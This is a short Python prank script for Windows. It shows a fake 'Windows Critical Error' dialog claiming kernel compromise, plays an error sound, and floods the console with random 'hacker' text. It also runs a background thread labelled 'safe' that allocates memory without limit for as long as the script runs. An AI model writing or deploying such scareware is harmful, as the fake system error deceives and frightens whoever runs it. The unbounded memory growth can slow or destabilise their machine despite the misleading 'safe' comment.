import os
import random
import ctypes
import time
import threading

# Fullscreen terminal
os.system("mode con cols=200 lines=60")
os.system("color 0A")

# Play Windows error sound
ctypes.windll.user32.MessageBeep(0x00000010)

# Fake Windows crash popup
ctypes.windll.user32.MessageBoxW(
    None,
    "FATAL SYSTEM ERROR\n\nKernel integrity compromised.\nMemory corruption detected.\n\nPress OK to attempt recovery.",
    "Windows Critical Error",
    0x10 | 0x0
)

# Memory burner (safe)
junk = []

def eat_memory():
    while True:
        junk.append("X" * random.randint(50000, 200000))  # small bursts
        time.sleep(0.05)

threading.Thread(target=eat_memory, daemon=True).start()

# Random hacker text generator
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+=<>?/\\|"

def random_line():
    return "".join(random.choice(chars) for _ in range(random.randint(80, 180)))

# Main spam loop
while True:
    print(f"[0x{random.randint(100000,999999)}] {random_line()}")
    time.sleep(0.01)
